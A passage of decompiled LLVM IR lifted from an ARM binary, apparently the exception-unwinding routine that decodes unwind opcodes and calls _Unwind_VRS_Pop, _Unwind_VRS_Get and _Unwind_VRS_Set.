  %v2_18dd0 = or i32 %v2_18dc4, 262144
  store i32 %v2_18dd0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ccc

bb157:                                            ; preds = %dec_label_pc_18db4
  %v2_18dc0 = urem i32 %v0_18d30, 8
  %v2_18dc8 = add nuw nsw i32 %v2_18dc0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_18dd8 = or i32 %v2_18dc8, 524288
  store i32 %v2_18dd8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ccc

dec_label_pc_18de0:                               ; preds = %dec_label_pc_18cf0
  %v0_18de0 = load i32, i32* %ip.global-to-local, align 4
  %v7_18de0 = icmp eq i32 %v0_18de0, 198
  store i1 %v7_18de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18de0, label %dec_label_pc_18de8, label %dec_label_pc_18bec

dec_label_pc_18de8:                               ; preds = %dec_label_pc_18de0
  %v0_18de8 = load i32, i32* @r5, align 4
  %v1_18de8 = add i32 %v0_18de8, 8
  %v2_18de8 = inttoptr i32 %v1_18de8 to i8*
  %v3_18de8 = load i8, i8* %v2_18de8, align 1
  %v4_18de8 = zext i8 %v3_18de8 to i32
  store i32 %v4_18de8, i32* %r3.global-to-local, align 4
  %v2_18dec = icmp eq i8 %v3_18de8, 0
  store i1 %v2_18dec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18dec, label %dec_label_pc_18dfc, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_18de8
  %v2_18df0 = add nsw i32 %v4_18de8, -1
  store i32 %v2_18df0, i32* %r3.global-to-local, align 4
  %v2_18df4 = trunc i32 %v2_18df0 to i8
  store i8 %v2_18df4, i8* %v2_18de8, align 1
  %v0_18df8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18df8.pr.pr, label %.thread48.dec_label_pc_18dfc_crit_edge, label %dec_label_pc_18e30

.thread48.dec_label_pc_18dfc_crit_edge:           ; preds = %.thread48
  %v0_18dfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18dfc

dec_label_pc_18dfc:                               ; preds = %.thread48.dec_label_pc_18dfc_crit_edge, %dec_label_pc_18de8
  %v2_18e14 = phi i32 [ %v0_18dfc.pre, %.thread48.dec_label_pc_18dfc_crit_edge ], [ %v0_18de8, %dec_label_pc_18de8 ]
  %v1_18dfc = add i32 %v2_18e14, 9
  %v2_18dfc = inttoptr i32 %v1_18dfc to i8*
  %v3_18dfc = load i8, i8* %v2_18dfc, align 1
  %v4_18dfc = zext i8 %v3_18dfc to i32
  store i32 %v4_18dfc, i32* %r3.global-to-local, align 4
  %v2_18e00 = icmp eq i8 %v3_18dfc, 0
  store i1 %v2_18e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e00, label %dec_label_pc_18e4c, label %dec_label_pc_18e10

dec_label_pc_18e10:                               ; preds = %dec_label_pc_18dfc
  %v1_18e10 = add nsw i32 %v4_18dfc, -1
  store i32 %v1_18e10, i32* %r3.global-to-local, align 4
  %v1_18e14 = trunc i32 %v1_18e10 to i8
  store i8 %v1_18e14, i8* %v2_18dfc, align 1
  %v0_18e18 = load i32, i32* @r5, align 4
  %v1_18e18 = add i32 %v0_18e18, 4
  %v2_18e18 = inttoptr i32 %v1_18e18 to i32*
  %v3_18e18 = load i32, i32* %v2_18e18, align 4
  store i32 %v3_18e18, i32* %r2.global-to-local, align 4
  %v1_18e1c = inttoptr i32 %v3_18e18 to i32*
  %v2_18e1c = load i32, i32* %v1_18e1c, align 4
  store i32 %v2_18e1c, i32* %r0.global-to-local, align 4
  %v4_18e1c = add i32 %v3_18e18, 4
  store i32 %v4_18e1c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18e1c, i32* %v2_18e18, align 4
  %v0_18e28 = load i32, i32* %r3.global-to-local, align 4
  %v1_18e28 = trunc i32 %v0_18e28 to i8
  %v2_18e28 = load i32, i32* @r5, align 4
  %v3_18e28 = add i32 %v2_18e28, 8
  %v4_18e28 = inttoptr i32 %v3_18e28 to i8*
  store i8 %v1_18e28, i8* %v4_18e28, align 1
  %v0_18e2c = load i32, i32* %r0.global-to-local, align 4
  %v1_18e2c = load i32, i32* @r5, align 4
  %v2_18e2c = inttoptr i32 %v1_18e2c to i32*
  store i32 %v0_18e2c, i32* %v2_18e2c, align 4
  br label %dec_label_pc_18e30

dec_label_pc_18e30:                               ; preds = %.thread48, %dec_label_pc_18e10
  %v0_18e30 = load i32, i32* %r0.global-to-local, align 4
  %v3_18e30 = udiv i32 %v0_18e30, 16777216
  %v1_18e34 = urem i32 %v3_18e30, 16
  %v3_18e38 = mul i32 %v0_18e30, 256
  store i32 %v3_18e38, i32* %r0.global-to-local, align 4
  %v1_18e3c = add nuw nsw i32 %v1_18e34, 1
  store i32 %v1_18e3c, i32* %r2.global-to-local, align 4
  %v1_18e40 = and i32 %v3_18e30, 240
  store i32 %v1_18e40, i32* %r3.global-to-local, align 4
  %v1_18e44 = load i32, i32* @r5, align 4
  %v2_18e44 = inttoptr i32 %v1_18e44 to i32*
  store i32 %v3_18e38, i32* %v2_18e44, align 4
  %v0_18e48 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e48 = load i32, i32* %r3.global-to-local, align 4
  %v4_18e48 = mul i32 %v1_18e48, 4096
  %v5_18e48 = or i32 %v4_18e48, %v0_18e48
  br label %dec_label_pc_18e4c

dec_label_pc_18e4c:                               ; preds = %dec_label_pc_18dfc, %dec_label_pc_18e30
  %storemerge131 = phi i32 [ %v5_18e48, %dec_label_pc_18e30 ], [ 720897, %dec_label_pc_18dfc ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ccc

dec_label_pc_18e54:                               ; preds = %dec_label_pc_18c10
  %v0_18e54 = load i32, i32* @r5, align 4
  %v1_18e54 = add i32 %v0_18e54, 8
  %v2_18e54 = inttoptr i32 %v1_18e54 to i8*
  %v3_18e54 = load i8, i8* %v2_18e54, align 1
  %v4_18e54 = zext i8 %v3_18e54 to i32
  store i32 %v4_18e54, i32* %r3.global-to-local, align 4
  %v2_18e58 = icmp eq i8 %v3_18e54, 0
  store i1 %v2_18e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e58, label %dec_label_pc_18e68, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_18e54
  %v2_18e5c = add nsw i32 %v4_18e54, -1
  store i32 %v2_18e5c, i32* %r3.global-to-local, align 4
  %v2_18e60 = trunc i32 %v2_18e5c to i8
  store i8 %v2_18e60, i8* %v2_18e54, align 1
  %v0_18e64.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e64.pr.pr, label %.thread52.dec_label_pc_18e68_crit_edge, label %dec_label_pc_18e9c

.thread52.dec_label_pc_18e68_crit_edge:           ; preds = %.thread52
  %v0_18e68.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e68

dec_label_pc_18e68:                               ; preds = %.thread52.dec_label_pc_18e68_crit_edge, %dec_label_pc_18e54
  %v2_18e80 = phi i32 [ %v0_18e68.pre, %.thread52.dec_label_pc_18e68_crit_edge ], [ %v0_18e54, %dec_label_pc_18e54 ]
  %v1_18e68 = add i32 %v2_18e80, 9
  %v2_18e68 = inttoptr i32 %v1_18e68 to i8*
  %v3_18e68 = load i8, i8* %v2_18e68, align 1
  %v4_18e68 = zext i8 %v3_18e68 to i32
  store i32 %v4_18e68, i32* %r3.global-to-local, align 4
  %v2_18e6c = icmp eq i8 %v3_18e68, 0
  store i1 %v2_18e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e6c, label %dec_label_pc_18eb8, label %dec_label_pc_18e7c

dec_label_pc_18e7c:                               ; preds = %dec_label_pc_18e68
  %v1_18e7c = add nsw i32 %v4_18e68, -1
  store i32 %v1_18e7c, i32* %r3.global-to-local, align 4
  %v1_18e80 = trunc i32 %v1_18e7c to i8
  store i8 %v1_18e80, i8* %v2_18e68, align 1
  %v0_18e84 = load i32, i32* @r5, align 4
  %v1_18e84 = add i32 %v0_18e84, 4
  %v2_18e84 = inttoptr i32 %v1_18e84 to i32*
  %v3_18e84 = load i32, i32* %v2_18e84, align 4
  store i32 %v3_18e84, i32* %r2.global-to-local, align 4
  %v1_18e88 = inttoptr i32 %v3_18e84 to i32*
  %v2_18e88 = load i32, i32* %v1_18e88, align 4
  store i32 %v2_18e88, i32* %r0.global-to-local, align 4
  %v4_18e88 = add i32 %v3_18e84, 4
  store i32 %v4_18e88, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18e88, i32* %v2_18e84, align 4
  %v0_18e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_18e94 = trunc i32 %v0_18e94 to i8
  %v2_18e94 = load i32, i32* @r5, align 4
  %v3_18e94 = add i32 %v2_18e94, 8
  %v4_18e94 = inttoptr i32 %v3_18e94 to i8*
  store i8 %v1_18e94, i8* %v4_18e94, align 1
  %v0_18e98 = load i32, i32* %r0.global-to-local, align 4
  %v1_18e98 = load i32, i32* @r5, align 4
  %v2_18e98 = inttoptr i32 %v1_18e98 to i32*
  store i32 %v0_18e98, i32* %v2_18e98, align 4
  br label %dec_label_pc_18e9c

dec_label_pc_18e9c:                               ; preds = %.thread52, %dec_label_pc_18e7c
  %v0_18e9c = load i32, i32* %r0.global-to-local, align 4
  %v3_18e9c = udiv i32 %v0_18e9c, 16777216
  %v1_18ea0 = urem i32 %v3_18e9c, 16
  %v3_18ea4 = mul i32 %v0_18e9c, 256
  store i32 %v3_18ea4, i32* %r0.global-to-local, align 4
  %v1_18ea8 = add nuw nsw i32 %v1_18ea0, 1
  store i32 %v1_18ea8, i32* %r2.global-to-local, align 4
  %v1_18eac = and i32 %v3_18e9c, 240
  store i32 %v1_18eac, i32* %r3.global-to-local, align 4
  %v1_18eb0 = load i32, i32* @r5, align 4
  %v2_18eb0 = inttoptr i32 %v1_18eb0 to i32*
  store i32 %v3_18ea4, i32* %v2_18eb0, align 4
  %v0_18eb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18eb4 = load i32, i32* %r3.global-to-local, align 4
  %v4_18eb4 = mul i32 %v1_18eb4, 4096
  %v5_18eb4 = or i32 %v4_18eb4, %v0_18eb4
  br label %dec_label_pc_18eb8

dec_label_pc_18eb8:                               ; preds = %dec_label_pc_18e68, %dec_label_pc_18e9c
  %storemerge130 = phi i32 [ %v5_18eb4, %dec_label_pc_18e9c ], [ 720897, %dec_label_pc_18e68 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ccc

dec_label_pc_18ec0:                               ; preds = %dec_label_pc_18bec
  %v0_18ec0 = load i32, i32* @r5, align 4
  %v1_18ec0 = add i32 %v0_18ec0, 8
  %v2_18ec0 = inttoptr i32 %v1_18ec0 to i8*
  %v3_18ec0 = load i8, i8* %v2_18ec0, align 1
  %v4_18ec0 = zext i8 %v3_18ec0 to i32
  store i32 %v4_18ec0, i32* %r3.global-to-local, align 4
  %v2_18ec4 = icmp eq i8 %v3_18ec0, 0
  store i1 %v2_18ec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ec4, label %dec_label_pc_1906c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_18ec0
  %v2_18ec8 = add nsw i32 %v4_18ec0, -1
  store i32 %v2_18ec8, i32* %r3.global-to-local, align 4
  %v2_18ecc = trunc i32 %v2_18ec8 to i8
  store i8 %v2_18ecc, i8* %v2_18ec0, align 1
  %v0_18ed0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18ed0.pr.pr, label %.thread56.dec_label_pc_1906c_crit_edge, label %dec_label_pc_18ed4

.thread56.dec_label_pc_1906c_crit_edge:           ; preds = %.thread56
  %v0_1906c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1906c

dec_label_pc_18ed4:                               ; preds = %.thread56, %dec_label_pc_19078
  %v0_18ed4 = load i32, i32* %r0.global-to-local, align 4
  %v3_18ed4 = udiv i32 %v0_18ed4, 16777216
  store i32 %v3_18ed4, i32* %r3.global-to-local, align 4
  store i32 %v3_18ed4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_18ed4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_18edc = mul i32 %v0_18ed4, 256
  store i32 %v3_18edc, i32* %r0.global-to-local, align 4
  %v1_18ee0 = load i32, i32* @r5, align 4
  %v2_18ee0 = inttoptr i32 %v1_18ee0 to i32*
  store i32 %v3_18edc, i32* %v2_18ee0, align 4
  br i1 %tmp184, label %dec_label_pc_18c9c, label %dec_label_pc_18ee8

dec_label_pc_18ee8:                               ; preds = %dec_label_pc_18ed4
  %v0_18ee8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18ee8 = and i32 %v0_18ee8, 240
  store i32 %v1_18ee8, i32* %r3.global-to-local, align 4
  %v2_18ee8 = icmp eq i32 %v1_18ee8, 0
  store i1 %v2_18ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ee8, label %dec_label_pc_18ef0, label %dec_label_pc_18c9c

dec_label_pc_18ef0:                               ; preds = %dec_label_pc_18ee8
  %v0_18ef0 = load i32, i32* @r7, align 4
  store i32 %v0_18ef0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_18ef8 = load i32, i32* %r2.global-to-local, align 4
  %v4_18ef8 = call i32 @_Unwind_VRS_Pop(i32 %v0_18ef0, i32 4, i32 %v2_18ef8, i32 0)
  store i32 %v4_18ef8, i32* %r0.global-to-local, align 4
  %v2_18efc = icmp eq i32 %v4_18ef8, 0
  store i1 %v2_18efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18efc, label %dec_label_pc_189cc.backedge, label %dec_label_pc_18f04

dec_label_pc_18f04:                               ; preds = %dec_label_pc_18ef0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18af4

dec_label_pc_18f0c:                               ; preds = %dec_label_pc_18d38
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18f18 = load i32, i32* @r7, align 4
  store i32 %v0_18f18, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_18f24 = call i32 @_Unwind_VRS_Get(i32 %v0_18f18, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18f24, i32* %r0.global-to-local, align 4
  %v0_18f28 = load i32, i32* @r5, align 4
  %v1_18f28 = add i32 %v0_18f28, 8
  %v2_18f28 = inttoptr i32 %v1_18f28 to i8*
  %v3_18f28 = load i8, i8* %v2_18f28, align 1
  %v4_18f28 = zext i8 %v3_18f28 to i32
  store i32 %v4_18f28, i32* %r1.global-to-local, align 4
  %v2_18f2c = icmp eq i8 %v3_18f28, 0
  store i1 %v2_18f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f2c, label %dec_label_pc_18f3c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_18f0c
  %v2_18f30 = add nsw i32 %v4_18f28, -1
  store i32 %v2_18f30, i32* %r3.global-to-local, align 4
  %v2_18f34 = trunc i32 %v2_18f30 to i8
  store i8 %v2_18f34, i8* %v2_18f28, align 1
  %v0_18f38.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f38.pr.pr, label %.thread58.dec_label_pc_18f3c_crit_edge, label %dec_label_pc_18f68

.thread58.dec_label_pc_18f3c_crit_edge:           ; preds = %.thread58
  %v0_18f3c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f3c

dec_label_pc_18f3c:                               ; preds = %.thread58.dec_label_pc_18f3c_crit_edge, %dec_label_pc_18f0c
  %v2_18f50 = phi i32 [ %v0_18f3c.pre, %.thread58.dec_label_pc_18f3c_crit_edge ], [ %v0_18f28, %dec_label_pc_18f0c ]
  %v1_18f3c = add i32 %v2_18f50, 9
  %v2_18f3c = inttoptr i32 %v1_18f3c to i8*
  %v3_18f3c = load i8, i8* %v2_18f3c, align 1
  %v4_18f3c = zext i8 %v3_18f3c to i32
  store i32 %v4_18f3c, i32* %r3.global-to-local, align 4
  %v2_18f40 = icmp eq i8 %v3_18f3c, 0
  store i1 %v2_18f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f40, label %bb158, label %dec_label_pc_18f4c

bb158:                                            ; preds = %dec_label_pc_18f3c
  %v1_18f44 = load i32, i32* @r6, align 4
  store i32 %v1_18f44, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f90

dec_label_pc_18f4c:                               ; preds = %dec_label_pc_18f3c
  %v1_18f4c = add nsw i32 %v4_18f3c, -1
  store i32 %v1_18f4c, i32* %r3.global-to-local, align 4
  %v1_18f50 = trunc i32 %v1_18f4c to i8
  store i8 %v1_18f50, i8* %v2_18f3c, align 1
  %v0_18f54 = load i32, i32* @r5, align 4
  %v1_18f54 = add i32 %v0_18f54, 4
  %v2_18f54 = inttoptr i32 %v1_18f54 to i32*
  %v3_18f54 = load i32, i32* %v2_18f54, align 4
  store i32 %v3_18f54, i32* %r2.global-to-local, align 4
  %v1_18f58 = inttoptr i32 %v3_18f54 to i32*
  %v2_18f58 = load i32, i32* %v1_18f58, align 4
  store i32 %v2_18f58, i32* %r0.global-to-local, align 4
  %v4_18f58 = add i32 %v3_18f54, 4
  store i32 %v4_18f58, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18f60 = inttoptr i32 %v0_18f54 to i32*
  store i32 %v2_18f58, i32* %v1_18f60, align 4
  %v5_18f60 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18f60, i32* %v2_18f54, align 4
  %v0_18f64 = load i32, i32* %r3.global-to-local, align 4
  %v1_18f64 = trunc i32 %v0_18f64 to i8
  %v2_18f64 = load i32, i32* @r5, align 4
  %v3_18f64 = add i32 %v2_18f64, 8
  %v4_18f64 = inttoptr i32 %v3_18f64 to i8*
  store i8 %v1_18f64, i8* %v4_18f64, align 1
  br label %dec_label_pc_18f68

dec_label_pc_18f68:                               ; preds = %.thread58, %dec_label_pc_18f4c
  %v0_18f68 = load i32, i32* @r5, align 4
  %v1_18f68 = inttoptr i32 %v0_18f68 to i32*
  %v2_18f68 = load i32, i32* %v1_18f68, align 4
  store i32 %v2_18f68, i32* %r3.global-to-local, align 4
  %v3_18f6c = mul i32 %v2_18f68, 256
  store i32 %v3_18f6c, i32* %r0.global-to-local, align 4
  %v3_18f70 = udiv i32 %v2_18f68, 16777216
  store i32 %v3_18f70, i32* %r2.global-to-local, align 4
  store i32 %v3_18f6c, i32* %v1_18f68, align 4
  %v0_18f78 = load i32, i32* %r2.global-to-local, align 4
  %v1_18f78 = and i32 %v0_18f78, 128
  %v2_18f78 = icmp eq i32 %v1_18f78, 0
  store i1 %v2_18f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f78, label %.thread129, label %dec_label_pc_18f8c

.thread129:                                       ; preds = %dec_label_pc_18f68
  %v4_18f7c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_18f7c, i32* %ip.global-to-local, align 4
  %v1_18f80 = urem i32 %v0_18f78, 256
  store i32 %v1_18f80, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_19000

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f68
  %v1_18f8063 = urem i32 %v0_18f78, 256
  store i32 %v1_18f8063, i32* %r2.global-to-local, align 4
  %v0_18f8c = load i32, i32* @r5, align 4
  %v1_18f8c = add i32 %v0_18f8c, 8
  %v2_18f8c = inttoptr i32 %v1_18f8c to i8*
  %v3_18f8c = load i8, i8* %v2_18f8c, align 1
  %v4_18f8c = zext i8 %v3_18f8c to i32
  store i32 %v4_18f8c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18f90

dec_label_pc_18f90:                               ; preds = %bb158, %dec_label_pc_18f8c
  %v3_18fb099 = phi i32 [ %v2_18f50, %bb158 ], [ %v0_18f8c, %dec_label_pc_18f8c ]
  %v0_18f9892 = phi i32 [ %v1_18f44, %bb158 ], [ %v1_18f8063, %dec_label_pc_18f8c ]
  %v3_18f90 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_18f90, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18f98

dec_label_pc_18f98:                               ; preds = %dec_label_pc_18f98.backedge, %dec_label_pc_18f90
  %v3_18fb0 = phi i32 [ %v3_18fb0100, %dec_label_pc_18f98.backedge ], [ %v3_18fb099, %dec_label_pc_18f90 ]
  %v0_18fac = phi i32 [ %v2_18f9c.pre, %dec_label_pc_18f98.backedge ], [ 2, %dec_label_pc_18f90 ]
  %v0_18f9c = phi i32 [ %v0_18f9c.pre, %dec_label_pc_18f98.backedge ], [ %v3_18f90, %dec_label_pc_18f90 ]
  %v0_18f98 = phi i32 [ %v0_18f9895, %dec_label_pc_18f98.backedge ], [ %v0_18f9892, %dec_label_pc_18f90 ]
  %v1_18f98 = urem i32 %v0_18f98, 128
  %v7_18f9c = shl i32 %v1_18f98, %v0_18fac
  %v8_18f9c = add i32 %v7_18f9c, %v0_18f9c
  store i32 %v8_18f9c, i32* %ip.global-to-local, align 4
  %v0_18fa0 = load i32, i32* %r1.global-to-local, align 4
  %v2_18fa0 = icmp eq i32 %v0_18fa0, 0
  store i1 %v2_18fa0, i1* %cpsr_z.global-to-local, align 1
  %v1_18fa4 = add i32 %v0_18fa0, -1
  store i32 %v1_18fa4, i32* %r3.global-to-local, align 4
  store i32 %v8_18f9c, i32* %stack_var_-36, align 4
  %v1_18fac = add i32 %v0_18fac, 7
  store i32 %v1_18fac, i32* @lr, align 4
  br i1 %v2_18fa0, label %dec_label_pc_18fb8, label %bb159

bb159:                                            ; preds = %dec_label_pc_18f98
  %v2_18fb0 = trunc i32 %v1_18fa4 to i8
  %v4_18fb0 = add i32 %v3_18fb0, 8
  %v5_18fb0 = inttoptr i32 %v4_18fb0 to i8*
  store i8 %v2_18fb0, i8* %v5_18fb0, align 1
  %v0_18fb4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18fb4.pr, label %.dec_label_pc_18fb8_crit_edge, label %dec_label_pc_18fe4

.dec_label_pc_18fb8_crit_edge:                    ; preds = %bb159
  %v0_18fb8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18fb8

dec_label_pc_18fb8:                               ; preds = %.dec_label_pc_18fb8_crit_edge, %dec_label_pc_18f98
  %v2_18fd0 = phi i32 [ %v0_18fb8.pre, %.dec_label_pc_18fb8_crit_edge ], [ %v3_18fb0, %dec_label_pc_18f98 ]
  %v1_18fb8 = add i32 %v2_18fd0, 9
  %v2_18fb8 = inttoptr i32 %v1_18fb8 to i8*
  %v3_18fb8 = load i8, i8* %v2_18fb8, align 1
  %v4_18fb8 = zext i8 %v3_18fb8 to i32
  store i32 %v4_18fb8, i32* %r3.global-to-local, align 4
  %v2_18fbc = icmp eq i8 %v3_18fb8, 0
  store i1 %v2_18fbc, i1* %cpsr_z.global-to-local, align 1
  %v1_18fc0 = add nsw i32 %v4_18fb8, -1
  store i32 %v1_18fc0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_18fbc, label %dec_label_pc_18f98.backedge, label %dec_label_pc_18fcc

dec_label_pc_18fcc:                               ; preds = %dec_label_pc_18fb8
  %v1_18fcc = add i32 %v2_18fd0, 4
  %v2_18fcc = inttoptr i32 %v1_18fcc to i32*
  %v3_18fcc = load i32, i32* %v2_18fcc, align 4
  store i32 %v3_18fcc, i32* %r2.global-to-local, align 4
  %v1_18fd0 = trunc i32 %v1_18fc0 to i8
  store i8 %v1_18fd0, i8* %v2_18fb8, align 1
  %v0_18fd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18fd4 = inttoptr i32 %v0_18fd4 to i32*
  %v2_18fd4 = load i32, i32* %v1_18fd4, align 4
  store i32 %v2_18fd4, i32* %r0.global-to-local, align 4
  %v4_18fd4 = add i32 %v0_18fd4, 4
  store i32 %v4_18fd4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_18fdc = load i32, i32* @r5, align 4
  %v3_18fdc = add i32 %v2_18fdc, 8
  %v4_18fdc = inttoptr i32 %v3_18fdc to i8*
  store i8 3, i8* %v4_18fdc, align 1
  %v0_18fe0 = load i32, i32* @r5, align 4
  %v1_18fe0 = inttoptr i32 %v0_18fe0 to i32*
  %v2_18fe0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_18fe0, i32* %v1_18fe0, align 4
  %v3_18fe0 = add i32 %v0_18fe0, 4
  %v4_18fe0 = inttoptr i32 %v3_18fe0 to i32*
  %v5_18fe0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18fe0, i32* %v4_18fe0, align 4
  br label %dec_label_pc_18fe4

dec_label_pc_18fe4:                               ; preds = %bb159, %dec_label_pc_18fcc
  %v0_18fe4 = load i32, i32* @r5, align 4
  %v1_18fe4 = inttoptr i32 %v0_18fe4 to i32*
  %v2_18fe4 = load i32, i32* %v1_18fe4, align 4
  store i32 %v2_18fe4, i32* %r3.global-to-local, align 4
  %v3_18fe8 = udiv i32 %v2_18fe4, 16777216
  store i32 %v3_18fe8, i32* %r2.global-to-local, align 4
  %v1_18fec = and i32 %v3_18fe8, 128
  %v2_18fec = icmp eq i32 %v1_18fec, 0
  store i1 %v2_18fec, i1* %cpsr_z.global-to-local, align 1
  %v3_18ff0 = mul i32 %v2_18fe4, 256
  store i32 %v3_18ff0, i32* %r0.global-to-local, align 4
  store i32 %v3_18ff0, i32* %v1_18fe4, align 4
  %v0_18ff8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ff8 = urem i32 %v0_18ff8, 256
  store i32 %v1_18ff8, i32* %r2.global-to-local, align 4
  br i1 %v2_18fec, label %dec_label_pc_19000.loopexit, label %dec_label_pc_1902c

dec_label_pc_19000.loopexit:                      ; preds = %dec_label_pc_18fe4
  %v0_19004.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_19008.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19000

dec_label_pc_19000:                               ; preds = %dec_label_pc_19000.loopexit, %.thread129
  %v2_19008 = phi i32 [ 2, %.thread129 ], [ %v2_19008.pre, %dec_label_pc_19000.loopexit ]
  %v0_19004 = phi i32 [ %v4_18f7c, %.thread129 ], [ %v0_19004.pre, %dec_label_pc_19000.loopexit ]
  %v0_19000 = phi i32 [ %v1_18f80, %.thread129 ], [ %v1_18ff8, %dec_label_pc_19000.loopexit ]
  %v1_19000 = urem i32 %v0_19000, 128
  %v1_19004 = add i32 %v0_19004, 516
  %v7_19008 = shl i32 %v1_19000, %v2_19008
  %v8_19008 = add i32 %v1_19004, %v7_19008
  store i32 %v8_19008, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19010 = load i32, i32* @r7, align 4
  store i32 %v0_19010, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_19008, i32* %stack_var_-36, align 4
  %v5_19024 = call i32 @_Unwind_VRS_Set(i32 %v0_19010, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19024, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189cc.backedge

dec_label_pc_1902c:                               ; preds = %dec_label_pc_18fe4
  %v0_1902c = load i32, i32* @r5, align 4
  %v1_1902c = add i32 %v0_1902c, 8
  %v2_1902c = inttoptr i32 %v1_1902c to i8*
  %v3_1902c = load i8, i8* %v2_1902c, align 1
  %v4_1902c = zext i8 %v3_1902c to i32
  store i32 %v4_1902c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18f98.backedge

dec_label_pc_18f98.backedge:                      ; preds = %dec_label_pc_1902c, %dec_label_pc_18fb8
  %v3_18fb0100 = phi i32 [ %v0_1902c, %dec_label_pc_1902c ], [ %v2_18fd0, %dec_label_pc_18fb8 ]
  %v0_18f9895 = phi i32 [ %v1_18ff8, %dec_label_pc_1902c ], [ 176, %dec_label_pc_18fb8 ]
  %v0_18f9c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_18f9c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_18f98

dec_label_pc_19034:                               ; preds = %dec_label_pc_18d30
  %v0_19034 = load i32, i32* @r5, align 4
  %v1_19034 = add i32 %v0_19034, 8
  %v2_19034 = inttoptr i32 %v1_19034 to i8*
  %v3_19034 = load i8, i8* %v2_19034, align 1
  %v4_19034 = zext i8 %v3_19034 to i32
  store i32 %v4_19034, i32* %r3.global-to-local, align 4
  %v2_19038 = icmp eq i8 %v3_19034, 0
  store i1 %v2_19038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19038, label %dec_label_pc_1909c, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_19034
  %v2_1903c = add nsw i32 %v4_19034, -1
  store i32 %v2_1903c, i32* %r3.global-to-local, align 4
  %v2_19040 = trunc i32 %v2_1903c to i8
  store i8 %v2_19040, i8* %v2_19034, align 1
  %v0_19044.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19044.pr.pr, label %.thread66.dec_label_pc_1909c_crit_edge, label %dec_label_pc_19048

.thread66.dec_label_pc_1909c_crit_edge:           ; preds = %.thread66
  %v0_1909c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1909c

